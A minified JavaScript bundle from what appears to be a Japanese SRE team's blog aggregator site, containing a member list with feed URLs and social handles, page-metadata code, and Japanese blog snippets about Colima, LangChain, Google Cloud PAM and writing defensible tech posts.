"use strict";(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[983],{1807:function(e,t,o){o.d(t,{T:function(){return a}});let a=[{id:"yteraoka",name:"yteraoka",role:"SRE",bio:"ojisan",avatarSrc:"/avatars/yteraoka.jpeg",sources:["https://blog.1q77.com/index.xml","https://qiita.com/yteraoka/feed","https://medium.com/feed/@yteraoka","https://zenn.dev/yteraoka/feed"],includeUrlRegex:"",twitterUsername:"yteraoka",githubUsername:"yteraoka",websiteUrl:"https://blog.1q77.com/"},{id:"tozastation",name:"tozastation",role:"SRE",bio:"tarako_chan",avatarSrc:"/avatars/tozastation.jpg",sources:["https://qiita.com/tozastation/feed","https://tozastation.hashnode.dev/rss.xml","https://zenn.dev/tozastation/feed"],includeUrlRegex:"",twitterUsername:"tozastation",githubUsername:"tozastation",websiteUrl:"https://github.com/tozastation"},{id:"kyohmizu",name:"kyohmizu",role:"SRE",bio:"mizumoto",avatarSrc:"/avatars/kyohmizu.png",sources:["https://kyohmizu.hatenablog.com/feed","https://qiita.com/kyohmizu/feed","https://speakerdeck.com/kyohmizu.rss"],includeUrlRegex:"",twitterUsername:"kyohmizu",githubUsername:"kyohmizu",websiteUrl:"https://profile.kyohmizu.com/"},{id:"nwiizo",name:"nwiizo",role:"Software Developer",bio:"The Passionate Programmer",avatarSrc:"/avatars/nwiizo.jpeg",sources:["https://syu-m-5151.hatenablog.com/feed","https://zenn.dev/nwiizo/feed","https://speakerdeck.com/nwiizo.rss"],includeUrlRegex:"",twitterUsername:"nwiizo",githubUsername:"nwiizo",websiteUrl:"https://nwiizo.github.io/"},{id:"skikkh",name:"skikkh",role:"SRE",bio:"skikkh",avatarSrc:"/avatars/skikkh.jpeg",sources:["https://qiita.com/skikkh/feed"],includeUrlRegex:"",twitterUsername:"skikkh",githubUsername:"skikkh",websiteUrl:""},{id:"toshikish",name:"toshikish",role:"SRE",bio:"Toshiki Shimomura",avatarSrc:"/avatars/toshikish.png",sources:["https://toshikish.hateblo.jp/feed","https://zenn.dev/toshikish/feed","https://qiita.com/toshikish/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"toshikish",websiteUrl:""},{id:"Sreake",name:"Sreake",role:"",bio:"This Is The Sreake Section Blog.",avatarSrc:"/avatars/sreake.png",sources:["https://sreake.com/feed/"],includeUrlRegex:"blog",excludeUrlRegex:"event",twitterUsername:"SreakeJ",githubUsername:"",websiteUrl:"https://sreake.com"},{id:"Reckoner",name:"Reckoner",role:"",bio:"This Is The Reckoner Section Blog.",avatarSrc:"/avatars/reckoner.png",sources:[],includeUrlRegex:"blog",excludeUrlRegex:"event",twitterUsername:"reckoner_japan",githubUsername:"",websiteUrl:"https://reckoner.io/"},{id:"tez",name:"Takuya Tezuka",role:"JB",bio:"tez",avatarSrc:"/avatars/tezuka.jpeg",sources:["https://qiita.com/TT_Private/feed","https://speakerdeck.com/takuyatezuka.rss"],includeUrlRegex:"qiita.com/TT_Private",twitterUsername:"tt0603",githubUsername:"taku-tez",websiteUrl:"https://www.wantedly.com/id/takuya_tezuka"},{id:"sosan01",name:"Soichiro Tsuchida",role:"SRE",bio:"sosan",avatarSrc:"/avatars/sosan01.png",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"sosan01",websiteUrl:""},{id:"atsuya0",name:"Atsuya Tsukada",role:"SRE",bio:"human",avatarSrc:"/avatars/atsuya0.jpg",sources:["https://zenn.dev/tayusa/feed","https://qiita.com/atsuya0/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"atsuya0",websiteUrl:"https://github.com/atsuya0"},{id:"masasuzu",name:"SUZUKI, Masashi",role:"SRE",bio:"yasetai",avatarSrc:"/avatars/masasuzu.png",sources:["https://blog.masasuzu.net/feed","https://speakerdeck.com/masasuzu.rss"],includeUrlRegex:"",twitterUsername:"masasuz",githubUsername:"masasuzu",websiteUrl:"https://masasuzu.net"},{id:"kiyos",name:"Kyohei Saito",role:"SRE",bio:"haraheri",avatarSrc:"/avatars/kiyos.jpeg",sources:["https://zenn.dev/kyohei_saito/feed"],includeUrlRegex:"",twitterUsername:"kiyo_12_07",githubUsername:"kiyo-s",websiteUrl:""},{id:"mos914",name:"Yu Kaneko",role:"SRE",bio:"koke",avatarSrc:"/avatars/mos914.png",sources:["https://qiita.com/dirtymosschan/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"mos914",websiteUrl:""},{id:"unvavo",name:"nobu",role:"SRE",bio:"nobu",avatarSrc:"/avatars/nobu.png",sources:[],includeUrlRegex:"",twitterUsername:"unvavo",githubUsername:"unvavo",websiteUrl:""},{id:"hiroki-hasegawa",name:"長谷川 広樹",role:"なんらかのエンジニア",bio:"顔画像は著作権フリーですのでどうぞ",avatarSrc:"/avatars/hirokihasegawa.png",sources:["https://hiroki-hasegawa.hatenablog.jp/feed","https://speakerdeck.com/hiroki_hasegawa.rss"],includeUrlRegex:"",twitterUsername:"Hiroki__IT",githubUsername:"hiroki-it",websiteUrl:"https://hiroki-it.github.io/tech-notebook/"},{id:"kaisato",name:"Kai Sato",role:"SRE",bio:"domo",avatarSrc:"/avatars/kaisato.png",sources:[],includeUrlRegex:"",twitterUsername:"KAI21441756",githubUsername:"kaitexio",websiteUrl:""},{id:"ysakurai",name:"Yusuke Sakurai",role:"SRE",bio:"ysakurai",avatarSrc:"/avatars/ysakurai.jpg",sources:["https://qiita.com/ys1/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"saku3",websiteUrl:""},{id:"tayakun",name:"Soichiro Taya",role:"SRE",bio:"tayakun",avatarSrc:"/avatars/tayakun.png",sources:["https://qiita.com/tayakun/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"tayatamn",websiteUrl:""},{id:"SatohJohn",name:"SatohJohn",role:"Software Developer",bio:"SatohJohn",avatarSrc:"/avatars/satohjohn.png",sources:["https://qiita.com/satohjohn/feed","https://zenn.dev/satohjohn/feed"],includeUrlRegex:"",twitterUsername:"satohjohn",githubUsername:"satohjohn",websiteUrl:""},{id:"bayobayo0324",name:"bayobayo0324",role:"back/front/app Engineer",bio:"osake daisuki",avatarSrc:"/avatars/bayobayo0324.jpeg",sources:["https://qiita.com/bayobayo0324/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"bayobayo0324",websiteUrl:""},{id:"myamamoto",name:"myamamoto",role:"SRE",bio:"human",avatarSrc:"/avatars/myamamoto.jpeg",sources:["https://zenn.dev/ureuzy/feed"],includeUrlRegex:"",twitterUsername:"ureuzy",githubUsername:"ureuzy",websiteUrl:""},{id:"seno",name:"seno",role:"DBRE",bio:"seno",avatarSrc:"/avatars/seno.jpeg",sources:["https://zenn.dev/nedoko_dok0dko/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"senohirona",websiteUrl:""},{id:"sakama",name:"sakama",role:"SRE",bio:"homo sapiens",avatarSrc:"/avatars/sakama.jpeg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"junichiro-sakama",websiteUrl:""},{id:"stakamura",name:"Shohei Takamura",role:"SRE",bio:"SRE",avatarSrc:"/avatars/stakamura.jpg",sources:["https://zenn.dev/hakushou41/feed"],includeUrlRegex:"",twitterUsername:"hakushou41",githubUsername:"hakushou41",websiteUrl:""},{id:"toVersus",name:"Tsubasa Nagasawa",role:"SRE",bio:"lazy programmer",avatarSrc:"/avatars/toVersus.png",sources:["https://qiita.com/toVersus/feed","https://zenn.dev/toversus/feed"],includeUrlRegex:"",twitterUsername:"toversus26",githubUsername:"toVersus",websiteUrl:""},{id:"raba-jp",name:"Hiroki Sakuraba",role:"Software Developer",bio:"meow",avatarSrc:"/avatars/raba-jp.jpg",sources:["https://zenn.dev/raba_jp/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"raba-jp",websiteUrl:""},{id:"ixsakra",name:"Ryosuke Sakurai",role:"SRE",bio:"ganbarumasu 'w'",avatarSrc:"/avatars/ixsakra.jpg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:""},{id:"nnaka2992",name:"NAKADATE Naoki",role:"DBRE",bio:"what on the earth is Database?",avatarSrc:"/avatars/nnaka2992.jpg",sources:["https://nnaka2992.hatenablog.com/feed","https://zenn.dev/nnaka2992/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:"https://nnaka2992.hatenablog.com/"},{id:"satoken",name:"satoken",role:"SRE",bio:"",avatarSrc:"/avatars/satoken.jpg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:""},{id:"bells17",name:"bells17",role:"Software Engineer",bio:"Software Engineer",avatarSrc:"/avatars/bells17.jpeg",sources:["https://zenn.dev/bells17/feed","https://medium.com/feed/@bells17","https://speakerdeck.com/bells17.rss"],includeUrlRegex:"",twitterUsername:"bells17_",githubUsername:"bells17",websiteUrl:"https://bells17.io/"},{id:"hide-1",name:"Shuichi Inoue",role:"long-term internship student",bio:"I want to become a strong engineer :)",avatarSrc:"/avatars/hide-1.jpg",sources:["https://sreake.com/blog/config-connectortest/feed","https://sreake.com/blog/kubernetes-operation-with-chatgpt/feed","https://sreake.com/blog/kubernetes-operation-with-chatgpt4/feed","https://sreake.com/blog/chatgpt-slack-integration/feed"],includeUrlRegex:"",twitterUsername:"19MU50",githubUsername:"hide-1",websiteUrl:""},{id:"yuu0w0yuu",name:"Yutaro Shirayama",role:"SRE",bio:"( ˘ω˘ )",avatarSrc:"/avatars/shirayama.jpg",sources:["https://zenn.dev/yuu0w0yuu/feed"],includeUrlRegex:"",twitterUsername:"yuu0w0yuu",githubUsername:"yuu0w0yuu",websiteUrl:""},{id:"gawingowin",name:"Araki Shogo",role:"long-term internship student",bio:"born 2 be engineer",avatarSrc:"/avatars/araki-icon.jpg",sources:[],includeUrlRegex:"",twitterUsername:"GawinGowin",githubUsername:"GawinGowin",websiteUrl:""},{id:"nomadblacky",name:"Takumi Kadowaki",role:"Software Engineer @ Reckoner",bio:"Scala / Observability",avatarSrc:"/avatars/nomadblacky.jpg",sources:["https://zenn.dev/nomadblacky/feed","https://speakerdeck.com/nomadblacky.rss"],includeUrlRegex:"",twitterUsername:"nomadblacky",githubUsername:"NomadBlacky",websiteUrl:""},{id:"kobuchi",name:"Shu Kobuchi",role:"Software Developer",bio:"mammalian",avatarSrc:"/avatars/kobuchi.jpeg",sources:["https://shu-kob.hateblo.jp/feed","https://speakerdeck.com/shukob.rss"],includeUrlRegex:"",twitterUsername:"shu_kob",githubUsername:"shu-kob",websiteUrl:""},{id:"kojake_300",name:"Yuki Iwasaki",role:"SRE",bio:"Splatoon",avatarSrc:"/avatars/yuki_iwasaki.png",sources:["https://qiita.com/kojake_300/feed","https://zenn.dev/kojake_300/feed","https://speakerdeck.com/kojake_300.rss"],includeUrlRegex:"",twitterUsername:"kojake_300",githubUsername:"",websiteUrl:""},{id:"kurita",name:"Kurita Keigo",role:"long-term internship student",bio:"I want to enginner the reliablity of the site",avatarSrc:"/avatars/kurita.jpg",sources:["https://kechigon.hatenablog.com/feed"],includeUrlRegex:"",twitterUsername:"kechigongon",githubUsername:"kechigon",websiteUrl:"https://www.wantedly.com/id/keigo_kurita_e"},{id:"kaita-nakamura",name:"Kaita Nakamura",role:"SRE",bio:"kaita",avatarSrc:"/avatars/kaitanakamura.jpg",sources:["https://zenn.dev/z63d/feed"],includeUrlRegex:"",twitterUsername:"z63d_",githubUsername:"z63d",websiteUrl:""},{id:"masaru-komiyama",name:"masaru-komiyama",role:"SRE",bio:"SRE",avatarSrc:"/avatars/komiyama5380.jpg",sources:["https://qiita.com/masaru-komiyama/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:"https://qiita.com/masaru-komiyama/"},{id:"moz-sec",name:"Kobayashi Shun",role:"long-term internship student",bio:"I am a graduate student in Kyoto",avatarSrc:"/avatars/kobayashi.png",sources:["https://moz-security.hatenablog.com/feed","https://zenn.dev/moz_sec/feed","https://speakerdeck.com/moz_sec_.rss"],includeUrlRegex:"",twitterUsername:"moz_sec_",githubUsername:"moz-sec",websiteUrl:"https://moz-sec.com/"},{id:"melanmeg",name:"Naoya Yamamoto",role:"SRE",bio:"konpeko~",avatarSrc:"/avatars/melanmeg.png",sources:["https://zenn.dev/melanmeg/feed","https://speakerdeck.com/melanmeg.rss"],includeUrlRegex:"",twitterUsername:"melanmeg",githubUsername:"melanmeg",websiteUrl:"https://lit.link/melanmeg"},{id:"atusy",name:"Atsushi Yasumoto",role:"Software Developer",bio:"loves programming",avatarSrc:"/avatars/atusy.jpg",sources:["https://blog.atusy.net/index.xml"],includeUrlRegex:"",twitterUsername:"Atsushi776",githubUsername:"atusy",websiteUrl:"https://blog.atusy.net/"},{id:"yyamada",name:"Yunosuke Yamada",avatarSrc:"/avatars/yyamada.jpg",role:"Full Stack Engineer",bio:"筋トレ / LLM / Webアプリケーション",sources:["https://zenn.dev/kimitsu/feed"],githubUsername:"YunosukeY",twitterUsername:"east_k1mitsu",websiteUrl:"https://linktr.ee/kimitsu"},{id:"k-nagase",name:"Kohei Nagase",avatarSrc:"/avatars/koheinagase.jpg",role:"SRE",bio:"YANIKASU",sources:["https://zenn.dev/k_nagase/feed"],githubUsername:"k-ngs",twitterUsername:"koh_naga",websiteUrl:""},{id:"iota",name:"Itaru Ota",avatarSrc:"/avatars/iota.jpg",role:"Full Stack Engineer",bio:"A.R.E.",sources:["https://zenn.dev/iorandd/feed"],githubUsername:"Ota1022",twitterUsername:"iorandd",websiteUrl:"https://ota1022.github.io/"},{id:"kamono",name:"Makoto Kamono",avatarSrc:"/avatars/kamono.jpg",role:"SRE",bio:"kamo dayo~",sources:["https://zenn.dev/kamos/feed"],githubUsername:"Mkamono",twitterUsername:"duckend_pg",websiteUrl:""},{id:"akagawa",name:"Daisuke Akagawa",avatarSrc:"/avatars/akagawa.png",role:"Full Stack Engineer",bio:"Akasan",sources:["https://zenn.dev/akasan/feed","https://medium.com/feed/@daisuke1024akagawa"],githubUsername:"Akasan",twitterUsername:"",websiteUrl:""},{id:"kugimiya",name:"Daichi Kugimiya",avatarSrc:"/avatars/kugimiya.jpeg",role:"Full Stack Engineer",bio:"Kugimiya",sources:["https://zenn.dev/meziron/feed"],githubUsername:"daikugimiya0715",twitterUsername:"abimaruXD",websiteUrl:""}].sort((e,t)=>e.id<t.id?-1:1)},9756:function(e,t,o){o.d(t,{T:function(){return s}});var a=o(5893),i=o(9008),n=o.n(i),r=o(2556);let s=e=>{let{path:t,title:o,description:i,ogImageUrl:s,noindex:l,removeSiteNameFromTitle:c}=e,u="".concat(r.v.siteRoot).concat(t||"");return(0,a.jsxs)(n(),{children:[(0,a.jsx)("title",{children:c?o:"".concat(o," | ").concat(r.v.siteMeta.title)}),(0,a.jsx)("meta",{property:"og:title",content:o}),(0,a.jsx)("meta",{property:"og:url",content:u}),(0,a.jsx)("meta",{name:"twitter:card",content:"summary_large_image"}),(0,a.jsx)("meta",{property:"og:site",content:r.v.siteMeta.title}),(0,a.jsx)("meta",{property:"og:image",content:s||"".concat(r.v.siteRoot,"/og.png")}),!!i&&(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)("meta",{name:"description",content:i}),(0,a.jsx)("meta",{property:"og:description",content:i})]}),t&&(0,a.jsx)("link",{rel:"canonical",href:u}),l&&(0,a.jsx)("meta",{name:"robots",content:"noindex"})]})}},518:function(e,t,o){o.d(t,{ci:function(){return n},gO:function(){return r},gb:function(){return s},n4:function(){return i}});var a=o(1807);function i(e){return a.T.find(t=>t.id===e)}function n(e){let t=new URL(e);return(null==t?void 0:t.hostname)||"blog"}function r(e){return"https://www.google.com/s2/favicons?domain=".concat(e)}function s(e){return"/members/".concat(encodeURIComponent(e))}o(8928)},8928:function(e){e.exports=JSON.parse('[{"title":"MACのDocker 環境はcolima にしました","link":"https://syu-m-5151.hatenablog.com/entry/2025/04/16/201211","contentSnippet":"はじめにコンテナ技術は現代のソフトウェア開発において不可欠なツールとなっています。特にMacユーザーにとって、効率的なコンテナ環境の構築は開発ワークフローを大きく改善します。そんな中、ローカルの環境をColimaにしたのでブログにします。Colimaは、macOSとLinux上でコンテナランタイムを最小限の設定で実行できる軽量なツールです。Docker Desktopの代替として、あるいはLimaの機能を拡張するソリューションとして、多くの開発者に支持されています。github.comこのドキュメントでは、Colimaの基本的な機能と特徴、インストール方法、そして実際の使用例について詳しく説明します。Docker DesktopやLimaからの移行を検討している方や、単にMac上でより効率的なコンテナ環境を探している方に、Colimaという選択肢を紹介します。Colimaとは？Colimaは、macOS（およびLinux）上でコンテナランタイムを最小限のセットアップで実行するためのツールです。Limaという仮想マシンマネージャーを利用して、Docker、Containerd、Kubernetesなどを簡単に使えるようにしてくれます。主な特徴としては：Intel MacとApple Silicon Macの両方をサポートシンプルなCLIインターフェースと分かりやすいデフォルト設定自動ポートフォワーディングボリュームマウント複数インスタンスのサポート複数のコンテナランタイムをサポート（Docker、Containerd、Incusなど）なぜColimaを選んだのか元々はDocker Desktopを使っていましたが、一度Limaに移行し、そこからさらにColimaに移行することにしました。その理由はいくつかあります。シンプルなCLI: GUIではなくCLIベースなので、自動化やスクリプトに組み込みやすいですカスタマイズ性: 仮想マシンのCPU、メモリ、ディスク容量などを簡単に調整できますオープンソース: 完全にオープンソースで、ライセンス問題の心配がありません統合管理: LimaをベースにしながらもDocker、Containerd、Kubernetesなどを一元的に管理できる点が便利です正直、Limaで満足していた。動機としては気になったから移行したというのが本音Limaとの比較Colimaはより高レベルな方法でLimaを活用しています。具体的に言うと、Limaは仮想マシンを提供するツールである一方、Colimaはその上にDockerやContainerdなどのコンテナ環境を自動的に構築・設定します。これは、自分でLimaの設定ファイルを書いてDockerを動かす作業を自動化してくれるようなものです。つまり、Limaの複雑な設定や調整をせずに、すぐにコンテナ環境を使い始めることができます。Colimaの主な利点は：統合された環境: Limaは純粋な仮想マシン管理に特化していますが、ColimaはDocker/Containerd/Kubernetesの設定を自動的に行う点が便利ですシンプルなCLIインターフェース: 必要なコマンドが少なく、直感的に操作できます自動化のしやすさ: 特にbrew servicesとの統合が優れていますインストールと基本的な使い方Homebrewを使って簡単にインストールできます。brew install colima基本的な使い方はとてもシンプル：# 起動colima start# 状態確認colima status# 停止colima stop私の環境では次のような出力になっています。colima statusINFO[0000] colima is running using macOS Virtualization.Framework INFO[0000] arch: aarch64                                INFO[0000] runtime: docker                              INFO[0000] mountType: sshfs                             INFO[0000] socket: unix:///Users/nwiizo/.colima/default/docker.sock システム起動時に自動起動する設定開発環境として日常的に使うので、Macの起動時にColimaも自動的に起動するように設定しました。Homebrewのservicesを使うと簡単です。brew services start colimaこれだけで、Macを再起動してもColimaが自動的に起動するようになります。以前のLimaでは、~/Library/LaunchAgents/com.lima.docker.plistのようなLaunchAgentsのplistファイルを作成・編集して自動起動を設定する必要がありました。Colimaではbrew servicesコマンド一つで同様の設定ができるようになり、格段に簡単になりました！カスタマイズの例デフォルトのColimaは2CPU、2GiBメモリ、100GiBストレージで構成されていますが、必要に応じて変更できます。# CPUとメモリを増やす場合colima stopcolima start --cpu 4 --memory 8# 設定ファイルで編集する場合colima start --editLima/Docker Desktopからの移行で注意したことLima や Docker Desktopから移行する際に、いくつか注意点がありました：Dockerコンテキスト: Colimaは独自のDockerコンテキストを作成します。docker context lsとdocker context useコマンドで管理できます。Dockerソケットの場所: デフォルトでは~/.colima/default/docker.sockにあります。一部のツールで直接ソケットパスを指定する必要がある場合は、この場所を指定します。Limaとは異なるパスなので注意が必要です。ボリュームマウント: ホームディレクトリ以外のパスをマウントする場合は、設定ファイルのmountsセクションで明示的に指定する必要があります。既存のコンテナとイメージ: Lima や Docker Desktopで使っていたコンテナやイメージは自動的には引き継がれないので、必要なら再ビルドやpull が必要です。Colimaの動作確認実際にcolima statusコマンドを実行すると、以下のような情報が表示されます。colima statusINFO[0000] colima is running using macOS Virtualization.Framework INFO[0000] arch: aarch64                                INFO[0000] runtime: docker                              INFO[0000] mountType: sshfs                             INFO[0000] socket: unix:///Users/nwiizo/.colima/default/docker.sock また、colima listコマンドでは、実行中のColimaインスタンスの詳細な情報が確認できます。colima listPROFILE    STATUS     ARCH       CPUS    MEMORY    DISK      RUNTIME    ADDRESSdefault    Running    aarch64    2       2GiB      100GiB    dockerこれがColimaのデフォルト設定です。これらの値は必要に応じてcolima startコマンドのオプションや設定ファイルで変更できます。まとめLimaベースのColimaへの移行は思った以上に簡単で、日常の開発作業がより快適になりました。特にCLIベースのシンプルさと設定のわかりやすさが気に入っています。自動起動の設定（brew services start colima）が簡単なこともとても便利で、開発環境のセットアップが格段に楽になりました。Docker DesktopやLimaそのものから移行を検討している方、特にコンテナランタイムを簡単に導入したいMacユーザーの方には、Colimaを検討する価値があります。普通にローカルのCPUとメモリを喰う生成AIツール全盛時代に最適な環境がなにか俺にも分からん。","isoDate":"2025-04-16T11:12:11.000Z","dateMiliSeconds":1744801931000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"LangChainとVertexAIのgemini 2.0 flashで構造化出力に失敗するケースが直りそう","link":"https://blog.atusy.net/2025/04/16/lang-chain-vertexai-structured-output/","contentSnippet":"LangChainのStructured outputを使うと、文章中の構造を良い感じに読み取って、Pydanticで定義したデータ構造に落としてこんでくれます。","isoDate":"2025-04-16T00:00:00.000Z","dateMiliSeconds":1744761600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Google Cloud Privileged Access Manager (PAM)を使用したアカウント管理","link":"https://sreake.com/blog/account-management-by-google-cloud-privileged-access-manager/","contentSnippet":"はじめに Google Cloud Privileged Access Manager (PAM)は、Google Cloud における特権アクセス管理のためのフルマネージドサービスです。2024年5月にプレビュー版が提 […]The post Google Cloud Privileged Access Manager (PAM)を使用したアカウント管理 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-15T09:00:04.000Z","dateMiliSeconds":1744707604000,"authorName":"Sreake","authorId":"Sreake"},{"title":"防御力の高い技術ブログを書こう","link":"https://syu-m-5151.hatenablog.com/entry/2025/04/15/101247","contentSnippet":"はじめにある日のこと、私はもしくはあなたは思いつきました。そう、自分の考えを発信してみようと。それはまるで、小さな紙飛行機を窓から放り投げるような、どこまで飛ぶかわからない冒険でした。そんなわけで画面に向かい、キーボードを叩き始めたのですが、すぐに奇妙な不安が襲ってきたのです。ほら、誰かがそっと後ろから覗き込んで「それ、間違ってるよ」とか「それって昔の話でしょ」なんて言ってくるかもしれない。もっと恐ろしいのは「もっといいやり方があるのに」という呪文めいた言葉です。そんな呪文を浴びせられたら、私はきっと透明人間になりたくなるに違いありません。でも不思議なもので、そういう批判の声が聞こえてくるのは、実は自分の頭の中だったりするんですよね。まだ何も書いていないのに、もうすでに架空の批判者と対話している。ある意味、私たちは常に誰かと対話している生き物なのかもしれません。そこで考えたのです。批判に怯えて黙っているより、その批判をも包み込んでしまうような、不思議な力を持つ文章があるのではないかと。批判の矢を受け止めて、それを武器に変えてしまうような魔法のような文章。本日はそんな「防御力の高い」文章の作り方について、私なりの道案内をしてみたいと思います。ただし、これは魔法の呪文集ではなく、むしろ冒険の途中で見つけた不思議な地図のようなものです。この地図を頼りに、あなた自身の冒険を始めてみませんか？以前書いたブログの書き方はこちらです。syu-m-5151.hatenablog.comこのブログが良ければ読者になったり、nwiizoをフォロワーしてくれると嬉しいです。では、早速はじめていきます。はじめになぜ防御力が必要なのか解釈の枠組みの違い認知バイアスの影響オンラインの批判文化防御力を高める表現と内容の工夫主観的な表現と限定的な主張コンテキストと限界の明示実体験と具体例の活用肯定的なものを中心に語る根拠と出典の明示防御力の高い構成テクニック批判を先取りする構成異なる立場への配慮見出しと結論の工夫批判への対応と心構え「事実」と「解釈」の違いを理解する建設的なフィードバックを活かす過剰な期待を持たない明らかな失礼への対応執筆前の準備と実践自分のバイアスを認識する執筆前の自己対話信頼できる人のレビュー学び続ける姿勢を示すおわりになぜ防御力が必要なのか解釈の枠組みの違いそれぞれの人は独自の知識体系や思考の枠組みを持っているため、あなたの書いた内容が意図とは異なる形で解釈される可能性があります。例えば、「このツールは便利だ」というシンプルな記述も、読者の経験によって全く異なる意味に解釈されます。熟練エンジニアなら「生産性を高める強力なツール」と捉え、初心者なら「入門に適した簡易ツール」と理解するかもしれません。ミドルウェア開発者は「APIが整理されている」と考え、アプリケーション開発者は「ドキュメントが充実している」と解釈するでしょう。同じ言葉でも、読者の立場や背景知識によって解釈の幅が大きく変わることを認識しておくことが、防御力の第一歩です。認知バイアスの影響私たち全員が持つ認知バイアスにより、偏ったものの見方で判断を下していると、異なる立場からの情報や論理的な指摘があっても、判断が覆らない場合があります。確証バイアス（自分の信念を補強する情報を重視し、反する情報を軽視する傾向）は特に影響力が強く、技術コミュニティでも顕著に見られます。特定のプログラミングパラダイムや技術スタックに強いアイデンティティを持つエンジニアは、その技術の欠点を指摘されると、内容の正確さに関わらず反発することがあります。権威バイアス（有名人や権威ある組織の意見を過度に信頼する傾向）も考慮すべき要素です。あなたが無名のエンジニアであれば、大企業の有名エンジニアと異なる見解を述べる際には、特に丁寧な根拠の提示が求められます。オンラインの批判文化技術コミュニティでは批判的なフィードバックが珍しくなく、匿名性からより辛辣な表現になりがちです。オンラインディスカッションでは「バイクシェッド効果」（些細な点ほど多くの意見が集まる現象）も働きます。あなたが深く考察した核心的な技術論点よりも、使用したコード例の些細なスタイルの問題や、ちょっとした言い回しに批判が集中することがあります。完璧な記事を目指すあまり執筆をためらうより、防御力を高める工夫をしながら発信する方が建設的です。防御力を高める表現と内容の工夫主観的な表現と限定的な主張「これが正しい方法だ」という断言ではなく、「私の経験では」「私のチームでは」と限定して話すことで、意見の押し付けにならず、経験の共有として受け取ってもらえます。防御力の低い表現: 「XXフレームワークはYYフレームワークより優れている」防御力の高い表現: 「私のプロジェクトでは、このユースケースでXXフレームワークが適していました」この表現の違いは微妙ですが重要です。断言的な表現は「自分が正しく、異なる選択をしている人は間違っている」という含意を持ち、読者の反発を招きます。一方、経験として共有する表現は「私はこう感じた、あなたはどう思う？」という対話の余地を残します。特に効果的なのは「特定の状況下では」という条件付けです。「XXフレームワークはリアルタイム更新の多いUIには特に適しています」のように、適用範囲を明確にすることで、批判の余地を減らせます。ただし、自分の専門分野における確立された事実（「配列の線形探索はO(n)の時間複雑性を持つ」など）については、無理に主観的表現をする必要はありません。コンテキストと限界の明示使用環境、バージョン、チーム規模などの背景と、アプローチの限界を明確にすることで、批判を先回りできます。防御力の低い表現: 「この方法でデータベース処理が30%速くなる」防御力の高い表現: 「XXデータベース14.5、16GBメモリ環境、約500万レコードのデータセットで、私のケースでは処理時間が約30%改善。ただし、より大規模なデータでは異なる結果になる可能性があります」コンテキストには、技術的な環境だけでなく、組織的な制約も含めると良いでしょう。「チーム全員がXX言語に熟練していたため、学習コストを考慮してXXを選択した」といった説明は、技術選定の合理性を示す重要な要素です。限界を示す際は、具体的な条件を挙げるとより信頼性が増します。「1秒あたり100リクエスト以上の負荷では応答時間が悪化する」「100GB以上のデータセットでは別のアプローチが必要」など、明確な境界条件を示すことで、「これが全てではない」という謙虚さと「ここまではちゃんと考えている」という誠実さを同時に伝えられます。実体験と具体例の活用抽象的な主張より、実際に経験した具体的なケースを示すことで、反論されにくくなります。ただし、「事実」も一つの解釈に過ぎないことを忘れないでください。防御力の低い表現: 「マイクロサービスアーキテクチャは複雑すぎる」防御力の高い表現: 「私たちの10人チームでECサイトをマイクロサービス化した際、サービス間の整合性維持に予想以上の工数がかかりました。具体的には、注文処理と在庫管理の同期において、トランザクション境界の設計に苦労し、最終的に以下のアプローチをとりました...」実体験を語る際のポイントは「検証可能な詳細」です。「パフォーマンスが向上した」という漠然とした記述より、「レスポンスタイムが平均342msから118msに短縮された」という具体的な数値の方が説得力があります。失敗談も非常に価値があります。「最初にAというアプローチを試みたが、Bという問題に直面したため、最終的にCという解決策にたどり着いた」という試行錯誤のプロセスは、他のエンジニアが同じ失敗を避けるのに役立ちます。失敗を率直に共有することで、「完璧を装おうとしていない」という誠実さも伝わります。肯定的なものを中心に語る批判よりも、自分が価値を見出しているものについて語る方が、読者との良い関係を築けます。防御力の低い表現: 「YY言語は設計に一貫性がなく不適切だ」防御力の高い表現: 「XX言語の型安全性は、特に大規模プロジェクトで次のような恩恵をもたらしました...」他の技術やアプローチを批判する代わりに、自分の選んだ技術の利点を具体的に説明することで、不必要な論争を避けられます。「YYは悪い」という否定的なメッセージより、「XXの良さはこれだ」という肯定的なメッセージの方が、心理的な抵抗を生みません。特に効果的なのは、自分が以前使っていた技術から新しい技術に移行した体験を共有することです。「以前はYYを使っていましたが、XXに移行してからこのような点が改善されました」という形式なら、YYの利用者も反感を抱きにくいでしょう。ただし、セキュリティやパフォーマンスに重大な問題がある場合など、警告が必要な場合は例外です。そのような場合でも、「避けるべき」という否定的表現より、「代替案を検討すべき状況」という建設的な表現を心がけましょう。根拠と出典の明示主張の根拠や出典を明確に示すことで、記事の信頼性と防御力が高まります。特に数値的な主張、ベストプラクティスの推奨、技術の問題点指摘、将来予測には出典が重要です。防御力の低い表現: 「このアプローチは処理速度が20倍向上する」防御力の高い表現: 